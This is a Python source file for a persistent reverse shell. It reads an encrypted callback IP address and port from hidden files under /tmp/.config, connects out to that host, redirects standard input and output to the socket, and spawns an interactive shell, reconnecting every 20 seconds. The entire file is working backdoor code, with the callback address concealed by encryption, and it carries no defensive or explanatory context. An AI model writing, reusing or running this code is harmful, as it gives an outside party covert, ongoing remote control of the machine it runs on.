import socket
import subprocess
import os
import time
import pty
import sys
from cryptography.fernet import Fernet

def decrypt_ip_port(config_file='/tmp/.config/config.txt', key_file='/tmp/.config/key'):
    with open(key_file, 'rb') as key_in:
        key = key_in.read()

    cipher_suite = Fernet(key)
    
    with open(config_file, 'rb') as config_in:
        encrypted_data = config_in.read()
        decrypted_data = cipher_suite.decrypt(encrypted_data).decode()
        ip, port = decrypted_data.split('\n')
        return ip, int(port)

def establish_connection(ip, port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            os.dup2(s.fileno(), 0)
            os.dup2(s.fileno(), 1)
            os.dup2(s.fileno(), 2)

            # Moved the shell spawning into a try block within the loop
            try:
                pty.spawn("sh")
            except Exception as shell_error:
                print(f"Shell session ended: {shell_error}", file=sys.stderr)
            
            time.sleep(20) # Reconnection attempt after the shell ends or fails

        except Exception as e:
            print(f"Connection failed: {e}", file=sys.stderr)
            time.sleep(20) # Adjusted sleep to 20 seconds

        finally:
            try:
                s.close()
            except:
                pass

if __name__ == "__main__":
    IP_ADDRESS, PORT = decrypt_ip_port()
    establish_connection(IP_ADDRESS, PORT)
